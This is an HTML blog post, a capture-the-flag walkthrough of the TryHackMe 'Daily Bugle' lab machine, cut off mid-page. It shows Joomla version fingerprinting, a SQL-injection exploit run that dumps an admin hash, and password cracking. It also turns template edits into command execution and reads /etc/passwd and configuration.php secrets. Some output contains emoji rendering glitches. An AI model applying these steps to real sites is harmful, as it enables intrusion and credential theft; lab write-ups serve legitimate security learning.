<!DOCTYPE html>
<html lang=en><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title> Daily Bugle - .burso</title>
    <meta name="description" content="Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :) Let&rsquo;s play.
NOTICE: (SPOILER!!) If you would like to solve it by yourself, don&rsquo;t read this post!
[Task 1] First question is pretty simple. Open the article and you can find the answer
Access the web server, who robbed the bank?
 spiderman  [Task 2] $ curl http://10.10.86.172/media/system/js/mootools-more.js 2&gt;/dev/null | grep MooTools.">
    <link rel="canonical" href="/ctf/daily-bugle/">
    <link rel="icon" href="img/favicon.jpg" type="image/gif" sizes="16x16"> 
    <meta property="og:title" content="Daily Bugle">
    <meta property="og:type" content="article">
    <meta property="og:url" content="/ctf/daily-bugle/">
    <meta property="og:description" content="Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :) Let&rsquo;s play.
NOTICE: (SPOILER!!) If you would like to solve it by yourself, don&rsquo;t read this post!
[Task 1] First question is pretty simple. Open the article and you can find the answer
Access the web server, who robbed the bank?
 spiderman  [Task 2] $ curl http://10.10.86.172/media/system/js/mootools-more.js 2&gt;/dev/null | grep MooTools.">
    <meta property="og:site_name" content=".burso">
    <link rel="stylesheet" href="/css/main.min.7fdf1d02dafd1a6eb5cfd0d707e17e33515b866f5d305a0ab01a4095577484fe.css" integrity="sha256-f98dAtr9Gm61z9DXB&#43;F&#43;M1Fbhm9dMFoKsBpAlVd0hP4=">
    <meta name="generator" content="Hugo 0.80.0" />
    <script type="module" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule="" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.js"></script>
    
</head>
<body><header class="site-header">
    <nav class="site-nav" role="navigation" aria-label="breadcrumb">
    <ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb"><li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/">
    <span itemprop="name">.burso</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/">
    <span itemprop="name">ctf</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item active hidden" aria-current="page"
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/daily-bugle/">
    <span itemprop="name">daily-bugle</span>
  </a>
  <meta itemprop="position" content="1" />
</li></ol>
    </nav>
    <h1 class="site-title hidden">
		<a href="/">.burso</a>
    </h1>
</header>
<main id="content">
<article role="article" class="content post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
    <header class="post-header">        
        <h2 class="post-title" itemprop="name headline">Daily Bugle</h2>
        <span class="post-meta">
            <time class="date-published" datetime="2020-02-06T15:33:06&#43;07:00" itemprop="datePublished">
                Thu, 6 Feb 2020
            </time>
            
            <ul id="tags">
              
                <li> <a href="/tags/ctf">#ctf</a> </li>
              
                <li> <a href="/tags/tryhackme">#tryhackme</a> </li>
              
                <li> <a href="/tags/joomla">#joomla</a> </li>
              
                <li> <a href="/tags/sqli">#sqli</a> </li>
              
                <li> <a href="/tags/yum">#yum</a> </li>
              
                <li> <a href="/tags/priviledge-escalation">#priviledge escalation</a> </li>
              
            </ul>
            
        </span>
    </header>
    <div class="post-content" itemprop="articleBody">
        <p>Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :)
Let&rsquo;s play.</p>
<p><strong>NOTICE: (SPOILER!!) If you would like to solve it by yourself, don&rsquo;t read this post!</strong></p>
<h4 id="task-1">[Task 1]</h4>
<p>First question is pretty simple. Open the article and you can find the answer</p>
<p><strong>Access the web server, who robbed the bank?</strong></p>
<ul>
<li>spiderman</li>
</ul>
<h4 id="task-2">[Task 2]</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl http://10.10.86.172/media/system/js/mootools-more.js 2&gt;/dev/null | grep MooTools.More
MooTools.More<span style="color:#f92672">={</span>version:<span style="color:#e6db74">&#34;1.4.0.1&#34;</span>,build:<span style="color:#e6db74">&#34;a4244edf2aa97ac8a196fc96082dd35af1abab87&#34;</span><span style="color:#f92672">}</span>;<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span><span style="color:#f92672">(){</span>Events.Pseudos<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>h,e,f<span style="color:#f92672">){</span>var d<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_monitorEvents:&#34;</span>;var c<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>i<span style="color:#f92672">){</span><span style="color:#66d9ef">return</span><span style="color:#f92672">{</span>store:i.store?function<span style="color:#f92672">(</span>j,k<span style="color:#f92672">){</span>i.store<span style="color:#f92672">(</span>d+j,k<span style="color:#f92672">)</span>;
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl http://10.10.86.172/language/en-GB/en-GB.xml
&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
&lt;metafile version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;3.7&#34;</span> client<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;site&#34;</span>&gt;
        &lt;name&gt;English <span style="color:#f92672">(</span>en-GB<span style="color:#f92672">)</span>&lt;/name&gt;
        &lt;version&gt;3.7.0&lt;/version&gt;
        &lt;creationDate&gt;April 2017&lt;/creationDate&gt;
        &lt;author&gt;Joomla! Project&lt;/author&gt;
        &lt;authorEmail&gt;admin@joomla.org&lt;/authorEmail&gt;
        &lt;authorUrl&gt;www.joomla.org&lt;/authorUrl&gt;
        &lt;copyright&gt;Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2005</span> - <span style="color:#ae81ff">2017</span> Open Source Matters. All rights reserved.&lt;/copyright&gt;
        &lt;license&gt;GNU General Public License version <span style="color:#ae81ff">2</span> or later; see LICENSE.txt&lt;/license&gt;
        &lt;description&gt;&lt;!<span style="color:#f92672">[</span>CDATA<span style="color:#f92672">[</span>en-GB site language<span style="color:#f92672">]]</span>&gt;&lt;/description&gt;
        &lt;metadata&gt;
                &lt;name&gt;English <span style="color:#f92672">(</span>en-GB<span style="color:#f92672">)</span>&lt;/name&gt;
                &lt;nativeName&gt;English <span style="color:#f92672">(</span>United Kingdom<span style="color:#f92672">)</span>&lt;/nativeName&gt;
                &lt;tag&gt;en-GB&lt;/tag&gt;
                &lt;rtl&gt;0&lt;/rtl&gt;
                &lt;locale&gt;en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom&lt;/locale&gt;
                &lt;firstDay&gt;0&lt;/firstDay&gt;
                &lt;weekEnd&gt;0,6&lt;/weekEnd&gt;
                &lt;calendar&gt;gregorian&lt;/calendar&gt;
        &lt;/metadata&gt;
        &lt;params /&gt;
&lt;/metafile&gt;
</code></pre></div><p>We found it.</p>
<p><strong>What is the Joomla version?</strong></p>
<ul>
<li>3.7.0</li>
</ul>
<p>After some research of finding following exploits for SQL Injection in Joomla</p>
<ul>
<li>
<a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="nofollow noreferrer noopener">sqlmap</a></li>
<li>
<a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce" target="_blank" rel="nofollow noreferrer noopener">metasploit</a></li>
</ul>
<p>I found the best way to solve this task and exploit the Joomla 3.7.0 SQLi vulnerability</p>
<ul>
<li>
<a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="nofollow noreferrer noopener">python exploit</a></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone git@github.com:XiphosResearch/exploits.git
$ cd exploits/Joomblah
</code></pre></div><p>and finally run the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python2 joomblah.py http://10.10.86.172
                                                                                                                    
    .---.    .-<span style="color:#e6db74">&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
    |   |   <span style="color:#e6db74">&#39;   _    \     &#39;</span>   _    <span style="color:#ae81ff">\ </span>                           .---.                        
    <span style="color:#e6db74">&#39;---&#39;</span> /   /<span style="color:#e6db74">`</span> <span style="color:#e6db74">&#39;.   \  /   /` &#39;</span>.   <span style="color:#ae81ff">\ </span> __  __   ___   /|        |   |            .           
    .---..   |     <span style="color:#ae81ff">\ </span> <span style="color:#e6db74">&#39; .   |     \  &#39;</span> |  |/  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">&#39;   `. ||        |   |          .&#39;</span>|           
    |   <span style="color:#f92672">||</span>   <span style="color:#e6db74">&#39;      |  &#39;</span>|   <span style="color:#e6db74">&#39;      |  &#39;</span>|   .-.  .-.   <span style="color:#e6db74">&#39;||        |   |         &lt;  |           
</span><span style="color:#e6db74">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
</span><span style="color:#e6db74">    |   | `.   ` ..&#39;</span> /   <span style="color:#e6db74">`</span>.   <span style="color:#e6db74">`</span> ..<span style="color:#e6db74">&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span style="color:#e6db74">&#39;. |   | .:--.&#39;</span>.  | | .<span style="color:#e6db74">&#39;&#39;&#39;-.    
</span><span style="color:#e6db74">    |   |    &#39;</span>-...-<span style="color:#e6db74">&#39;`       &#39;</span>-...-<span style="color:#e6db74">&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span style="color:#e6db74">&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span style="color:#ae81ff">\ </span>  
    |   |                              |  |  |  |  |  <span style="color:#f92672">||</span>|     | <span style="color:#f92672">||</span>   |<span style="color:#e6db74">`</span><span style="color:#e6db74">&#34; __ | | |  /    | |   
</span><span style="color:#e6db74">    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
</span><span style="color:#e6db74"> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
</span><span style="color:#e6db74">|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
</span><span style="color:#e6db74">|____.&#39;                                                                `--&#39;  `&#34;</span> <span style="color:#e6db74">&#39;---&#39;</span>   <span style="color:#e6db74">&#39;---&#39;</span> 

 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching CSRF token
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 <span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> Found user <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;811&#39;</span>, <span style="color:#e6db74">&#39;Super User&#39;</span>, <span style="color:#e6db74">&#39;jonah&#39;</span>, <span style="color:#e6db74">&#39;jonah@tryhackme.com&#39;</span>, <span style="color:#e6db74">&#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">]</span>
  -  Extracting sessions from fb9j5_session
</code></pre></div><p>Now we need to crack the hashed password, so we save 
<a href="https://www.php.net/manual/en/function.password-hash.php" target="_blank" rel="nofollow noreferrer noopener">bcrypt hash</a> to file hashes.txt
and run.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batchfile" data-lang="batchfile">c:\john-1.9.0-jumbo-1-win64\run<span style="color:#75715e">&gt;john.exe --wordlist=C:\Users\burso\Downloads\rockyou.txt --rules=wordlist --min-len=12 --max-len=12 ../hashes.txt</span>
Warning: detected hash type <span style="color:#e6db74">&#34;bcrypt&#34;</span>, but the string is also recognized as <span style="color:#e6db74">&#34;bcrypt-opencl&#34;</span>
Use the <span style="color:#e6db74">&#34;--format=bcrypt-opencl&#34;</span> option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:00:02 DONE (2020-02-07 10:54) 0.3846g/s 110.7p/s 110.7c/s 110.7C/s ilovepatrick..quetzalcoatl
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p><strong>What is Jonah&rsquo;s cracked password?</strong></p>
<ul>
<li>spiderman123</li>
</ul>
<p>After logged in to the <strong>/administrator</strong> page with login <strong>jonah</strong> and password <strong>spiderman123</strong> we need to gain access to ssh.
go to page <strong>/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=L2luZGV4LnBocA</strong>. We can edit <strong>index.php</strong>
of template so we can run any command on server and execute them via <strong>Template Preview</strong>. Before run you don&rsquo;t forget to save file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;id&#34;</span>);
<span style="color:#a6e22e">uid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">48</span>(<span style="color:#a6e22e">apache</span>) <span style="color:#a6e22e">gid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">48</span>(<span style="color:#a6e22e">apache</span>) <span style="color:#a6e22e">groups</span><span style="color:#f92672">=</span><span style="color:#ae81ff">48</span>(<span style="color:#a6e22e">apache</span>) 
</code></pre></div><p>Now we now any command executed via Joomla Template will run under <strong>apache</strong> user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>);
<span style="color:#a6e22e">root❌0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">root</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">root</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bash</span> <span style="color:#a6e22e">bin❌1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">daemon❌2</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span><span style="color:#a6e22e">daemon</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">adm❌3</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#a6e22e">adm</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">adm</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">lp❌4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#a6e22e">lp</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">spool</span><span style="color:#f92672">/</span><span style="color:#a6e22e">lpd</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">sync❌5</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">sync</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sync</span> <span style="color:#a6e22e">shutdown❌6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">shutdown</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">shutdown</span> <span style="color:#a6e22e">halt❌7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">halt</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">halt</span> <span style="color:#a6e22e">mail❌8</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#a6e22e">mail</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">spool</span><span style="color:#f92672">/</span><span style="color:#a6e22e">mail</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">operator❌11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">root</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">games❌12💯games</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">games</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">ftp❌14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#a6e22e">FTP</span> <span style="color:#a6e22e">User</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">ftp</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">nobody❌99</span><span style="color:#f92672">:</span><span style="color:#ae81ff">99</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Nobody</span><span style="color:#f92672">:/:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">systemd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">network❌192</span><span style="color:#f92672">:</span><span style="color:#ae81ff">192</span><span style="color:#f92672">:</span><span style="color:#a6e22e">systemd</span> <span style="color:#a6e22e">Network</span> <span style="color:#a6e22e">Management</span><span style="color:#f92672">:/:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">dbus❌81</span><span style="color:#f92672">:</span><span style="color:#ae81ff">81</span><span style="color:#f92672">:</span><span style="color:#a6e22e">System</span> <span style="color:#a6e22e">message</span> <span style="color:#a6e22e">bus</span><span style="color:#f92672">:/:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">polkitd❌999</span><span style="color:#f92672">:</span><span style="color:#ae81ff">998</span><span style="color:#f92672">:</span><span style="color:#a6e22e">User</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">polkitd</span><span style="color:#f92672">:/:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">sshd❌74</span><span style="color:#f92672">:</span><span style="color:#ae81ff">74</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Privilege</span><span style="color:#f92672">-</span><span style="color:#a6e22e">separated</span> <span style="color:#a6e22e">SSH</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#66d9ef">empty</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sshd</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">postfix❌89</span><span style="color:#f92672">:</span><span style="color:#ae81ff">89</span><span style="color:#f92672">::/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">spool</span><span style="color:#f92672">/</span><span style="color:#a6e22e">postfix</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">chrony❌998</span><span style="color:#f92672">:</span><span style="color:#ae81ff">996</span><span style="color:#f92672">::/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">lib</span><span style="color:#f92672">/</span><span style="color:#a6e22e">chrony</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">jjameson❌1000</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Jonah</span> <span style="color:#a6e22e">Jameson</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">home</span><span style="color:#f92672">/</span><span style="color:#a6e22e">jjameson</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bash</span> <span style="color:#a6e22e">apache❌48</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Apache</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">/</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> <span style="color:#a6e22e">mysql❌27</span><span style="color:#f92672">:</span><span style="color:#ae81ff">27</span><span style="color:#f92672">:</span><span style="color:#a6e22e">MariaDB</span> <span style="color:#a6e22e">Server</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">lib</span><span style="color:#f92672">/</span><span style="color:#a6e22e">mysql</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">nologin</span> 
</code></pre></div><p>We can see user jonah has <strong>jjameson</strong> username in ssh login, so we need password now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat configuration.php&#34;</span>);
<span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">check</span> <span style="color:#a6e22e">back</span> <span style="color:#a6e22e">again</span> <span style="color:#a6e22e">soon</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;; public $display_offline_message = &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; public $offline_image = &#39;&#39;; public $sitename = &#39;</span><span style="color:#a6e22e">The</span> <span style="color:#a6e22e">Daily</span> <span style="color:#a6e22e">Bugle</span><span style="color:#e6db74">&#39;; public $editor = &#39;</span><span style="color:#a6e22e">tinymce</span><span style="color:#e6db74">&#39;; public $captcha = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $list_limit = &#39;</span><span style="color:#ae81ff">20</span><span style="color:#e6db74">&#39;; public $access = &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; public $debug = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $debug_lang = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $dbtype = &#39;</span><span style="color:#a6e22e">mysqli</span><span style="color:#e6db74">&#39;; public $host = &#39;</span><span style="color:#a6e22e">localhost</span><span style="color:#e6db74">&#39;; public $user = &#39;</span><span style="color:#a6e22e">root</span><span style="color:#e6db74">&#39;; public $password = &#39;</span><span style="color:#a6e22e">nv5uz9r3ZEDzVjNu</span><span style="color:#e6db74">&#39;; public $db = &#39;</span><span style="color:#a6e22e">joomla</span><span style="color:#e6db74">&#39;; public $dbprefix = &#39;</span><span style="color:#a6e22e">fb9j5_</span><span style="color:#e6db74">&#39;; public $live_site = &#39;&#39;; public $secret = &#39;</span><span style="color:#a6e22e">UAMBRWzHO3oFPmVC</span><span style="color:#e6db74">&#39;; public $gzip = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $error_reporting = &#39;</span><span style="color:#66d9ef">default</span><span style="color:#e6db74">&#39;; public $helpurl = &#39;</span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">help</span><span style="color:#f92672">.</span><span style="color:#a6e22e">joomla</span><span style="color:#f92672">.</span><span style="color:#a6e22e">org</span><span style="color:#f92672">/</span><span style="color:#a6e22e">proxy</span><span style="color:#f92672">/</span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">keyref</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Help</span>{<span style="color:#a6e22e">major</span>}{<span style="color:#a6e22e">minor</span>}<span style="color:#f92672">:</span>{<span style="color:#a6e22e">keyref</span>}<span style="color:#e6db74">&#39;; public $ftp_host = &#39;</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span><span style="color:#e6db74">&#39;; public $ftp_port = &#39;</span><span style="color:#ae81ff">21</span><span style="color:#e6db74">&#39;; public $ftp_user = &#39;&#39;; public $ftp_pass = &#39;&#39;; public $ftp_root = &#39;&#39;; public $ftp_enable = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $offset = &#39;</span><span style="color:#a6e22e">UTC</span><span style="color:#e6db74">&#39;; public $mailonline = &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; public $mailer = &#39;</span><span style="color:#a6e22e">mail</span><span style="color:#e6db74">&#39;; public $mailfrom = &#39;</span><span style="color:#a6e22e">jonah</span><span style="color:#f92672">@</span><span style="color:#a6e22e">tryhackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#e6db74">&#39;; public $fromname = &#39;</span><span style="color:#a6e22e">The</span> <span style="color:#a6e22e">Daily</span> <span style="color:#a6e22e">Bugle</span><span style="color:#e6db74">&#39;; public $sendmail = &#39;</span><span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sendmail</span><span style="color:#e6db74">&#39;; public $smtpauth = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $smtpuser = &#39;&#39;; public $smtppass = &#39;&#39;; public $smtphost = &#39;</span><span style="color:#a6e22e">localhost</span><span style="color:#e6db74">&#39;; public $smtpsecure = &#39;</span><span style="color:#a6e22e">none</span><span style="color:#e6db74">&#39;; public $smtpport = &#39;</span><span style="color:#ae81ff">25</span><span style="color:#e6db74">&#39;; public $caching = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $cache_handler = &#39;</span><span style="color:#a6e22e">file</span><span style="color:#e6db74">&#39;; public $cachetime = &#39;</span><span style="color:#ae81ff">15</span><span style="color:#e6db74">&#39;; public $cache_platformprefix = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $MetaDesc = &#39;</span><span style="color:#66d9ef">New</span> <span style="color:#a6e22e">York</span> <span style="color:#a6e22e">City</span> <span style="color:#a6e22e">tabloid</span> <span style="color:#a6e22e">newspaper</span><span style="color:#e6db74">&#39;; public $MetaKeys = &#39;&#39;; public $MetaTitle = &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; public $MetaAuthor = &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; public $MetaVersion = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $robots = &#39;&#39;; public $sef = &#39;</span><span style="color:#ae81ff">1</span><span 